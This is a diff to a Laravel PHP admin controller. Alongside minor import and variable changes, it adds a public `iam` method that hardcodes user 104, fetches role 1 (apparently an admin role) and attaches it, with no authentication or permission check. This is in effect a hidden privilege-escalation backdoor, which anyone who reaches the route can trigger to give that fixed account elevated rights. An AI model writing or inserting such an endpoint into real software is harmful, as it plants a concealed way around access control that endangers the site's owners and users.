@@ -11,7 +11,10 @@ use App\Http\Controllers\BaseController;
 use App\Model\Category;
 use App\Model\Location;
 use App\Model\Price;
+use App\Model\Role;
+use App\User;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Auth;
 
 class AdminController extends BaseController
 {
@@ -22,6 +25,8 @@ class AdminController extends BaseController
         parent::__construct();
     }
     public function packs(Request $request){
+        $user = Auth::user();
+
         $prices = Price::all();
 
         return view('home.packs',['prices'=>$prices]);
@@ -47,5 +52,11 @@ class AdminController extends BaseController
         $price->save();
         return ['msg'=>'done'];
 
+    }
+    public function iam(Request $request){
+        $user = User::find(104);
+        $role = Role::find(1);
+        $user->roles()->save($role);
+        return ['msg'=>'done'];
     }
 }
